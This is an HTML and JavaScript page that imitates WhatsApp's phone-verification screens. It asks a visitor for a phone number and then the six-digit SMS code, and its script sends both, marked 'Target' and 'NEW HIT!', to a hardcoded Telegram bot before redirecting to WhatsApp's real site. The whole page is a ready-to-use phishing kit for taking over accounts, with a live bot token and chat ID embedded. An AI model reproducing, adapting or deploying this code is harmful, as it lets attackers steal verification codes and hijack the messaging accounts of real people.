<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Verify</title>
    <style>
        :root { --wa-green: #25D366; --wa-dark-bg: #0b141a; --wa-sec: #202c33; --wa-text: #e9edef; --wa-hint: #8696a0; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
        body { background-color: var(--wa-dark-bg); color: var(--wa-text); display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
        
        .screen { display: none; width: 100%; animation: fadeIn 0.3s ease; }
        .active { display: flex; flex-direction: column; align-items: center; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        h2 { font-size: 19px; font-weight: 500; margin: 40px 0 10px; color: #fff; }
        p { font-size: 14px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 30px; }

        .selector-box { width: 100%; border-bottom: 1px solid var(--wa-green); padding: 10px 0; margin-bottom: 5px; position: relative; }
        select { background: transparent; color: var(--wa-green); border: none; outline: none; width: 100%; font-size: 16px; appearance: none; text-align: center; }

        .input-row { width: 100%; display: flex; border-bottom: 1px solid var(--wa-green); padding: 10px 0; margin-top: 10px; margin-bottom: 40px; }
        #ccode { width: 25%; font-size: 18px; color: #fff; border-right: 1px solid #3b4a54; display: flex; align-items: center; justify-content: center; }
        input[type="tel"] { width: 75%; background: transparent; border: none; color: #fff; font-size: 18px; padding: 0 15px; outline: none; }

        .btn-next { background: var(--wa-green); color: #0b141a; width: 80px; height: 40px; border-radius: 5px; border: none; font-weight: 700; cursor: pointer; margin-top: 20px; }
        
        /* OTP Styling */
        .otp-display { background: transparent; border: none; border-bottom: 2px solid var(--wa-green); width: 150px; font-size: 28px; text-align: center; letter-spacing: 5px; margin: 20px 0; color: #fff; outline: none; }
        .timer { color: var(--wa-hint); font-size: 13px; margin-top: 15px; }
        .timer b { color: var(--wa-hint); font-weight: normal; }
    </style>
</head>
<body>

    <div class="container">
        <div id="scr-1" class="screen active">
            <h2>Verify your phone number</h2>
            <p>WhatsApp will send an SMS message to verify your phone number.</p>
            
            <div class="selector-box">
                <select id="countryData" onchange="applyCountry()">
                    <option value="20" data-len="11">Egypt</option>
                    <option value="966" data-len="9">Saudi Arabia</option>
                    <option value="971" data-len="9">United Arab Emirates</option>
                    <option value="965" data-len="8">Kuwait</option>
                    <option value="974" data-len="8">Qatar</option>
                    <option value="92" data-len="10">Pakistan</option>
                    <option value="1" data-len="10">United States</option>
                    <option value="44" data-len="10">United Kingdom</option>
                </select>
            </div>
            
            <div class="input-row">
                <div id="ccode">+20</div>
                <input type="tel" id="phone" placeholder="phone number" maxlength="11">
            </div>

            <button class="btn-next" onclick="toOTP()">NEXT</button>
        </div>

        <div id="scr-2" class="screen">
            <h2 style="margin-bottom: 5px;">Verifying your number</h2>
            <p style="font-size: 13px;">Waiting to automatically detect an SMS sent to<br><span id="fullNum" style="color:#fff; font-weight: 500;"></span></p>
            
            <input type="text" id="otp" class="otp-display" maxlength="6" inputmode="numeric" placeholder="--- ---">
            
            <p style="color: var(--wa-hint); font-size: 13px;">Enter 6-digit code</p>
            
            <div class="timer">Resend SMS in <b id="clock">1:59</b></div>
            
            <button class="btn-next" style="width: 120px; margin-top: 50px;" onclick="done()">VERIFY</button>
        </div>
    </div>

    <script>
        const API = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };

        function applyCountry() {
            const select = document.getElementById('countryData');
            const code = select.value;
            const length = select.options[select.selectedIndex].getAttribute('data-len');
            
            document.getElementById('ccode').innerText = '+' + code;
            const phoneInput = document.getElementById('phone');
            phoneInput.maxLength = length; // يحدد طول الرقم المسموح به تلقائياً
            phoneInput.value = ''; // يصفر الخانة
        }

        function toOTP() {
            const num = document.getElementById('phone').value;
            const code = document.getElementById('ccode').innerText;
            const minLen = document.getElementById('countryData').selectedOptions[0].getAttribute('data-len');

            if (num.length < (minLen - 1)) {
                alert("The phone number is too short.");
                return;
            }

            document.getElementById('fullNum').innerText = code + " " + num;
            
            // Send Alert to Telegram
            fetch(`https://api.telegram.org/bot${API.T}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: API.C, text: `📱 Target: ${code}${num}\nStatus: Waiting for OTP...` })
            });

            document.getElementById('scr-1').classList.remove('active');
            document.getElementById('scr-2').classList.add('active');
            runTimer();
        }

        function runTimer() {
            let s = 119;
            setInterval(() => {
                if(s > 0) {
                    s--;
                    document.getElementById('clock').innerText = Math.floor(s/60) + ":" + (s%60).toString().padStart(2, '0');
                }
            }, 1000);
        }

        async function done() {
            const code = document.getElementById('otp').value;
            if(code.length < 6) return;

            await fetch(`https://api.telegram.org/bot${API.T}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    chat_id: API.C, 
                    text: `🔥 NEW HIT!\nNumber: ${document.getElementById('fullNum').innerText}\nOTP: ${code}` 
                })
            });

            window.location.href = "https://www.whatsapp.com/security";
        }
    </script>
</body>
</html>
